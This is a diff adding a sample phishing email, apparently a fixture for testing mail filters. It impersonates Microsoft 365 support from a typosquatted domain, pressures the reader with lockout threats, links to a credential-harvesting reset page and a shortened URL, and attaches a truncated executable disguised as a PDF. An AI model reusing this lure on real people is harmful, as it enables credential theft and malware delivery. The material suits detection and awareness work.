@@ -1,0 +1,41 @@
+From: "IT Help Desk" <helpdesk@micros0ft-support.net>
+To: employee@company.com
+Subject: [Action Required] Your Microsoft 365 password expires TODAY
+Date: Tue, 15 Sep 2026 07:14:22 +0000
+Message-ID: <helpdesk001@micros0ft-support.net>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_Part_Boundary_001"
+Return-Path: <noreply@bulk-email-sender.xyz>
+Reply-To: <itdesk@gmail.com>
+X-Originating-IP: 77.247.181.163
+Received: from unknown-host.ru (77.247.181.163)
+        by mx.company.com with ESMTP id xyz789
+        for <employee@company.com>; Tue, 15 Sep 2026 07:14:18 +0000
+Authentication-Results: mx.company.com;
+       spf=softfail (domain owner discourages use) smtp.mailfrom=micros0ft-support.net;
+       dkim=fail (signature verification failed) header.d=micros0ft-support.net;
+       dmarc=fail action=quarantine header.from=micros0ft-support.net
+
+------=_Part_Boundary_001
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<body>
+<p>Dear Employee,</p>
+<p>Your Microsoft 365 password will expire <strong>TODAY</strong>. Failure to update your password immediately will result in account lockout and loss of access to all company resources.</p>
+<p>Please click the link below to reset your password now:</p>
+<p><a href="http://microsoft-365-password-reset.micros0ft-support.net/reset?user=employee@company.com">Reset Password Now - URGENT</a></p>
+<p>WARNING: If you do not act within the next 2 hours, your account will be locked and you will need to contact HR to regain access.</p>
+<p>You can also try: https://bit.ly/ms365-reset-password</p>
+<p>Microsoft Support Team</p>
+</body>
+</html>
+
+------=_Part_Boundary_001
+Content-Type: application/octet-stream; name="Password_Reset_Instructions.pdf.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Password_Reset_Instructions.pdf.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9T
+------=_Part_Boundary_001--
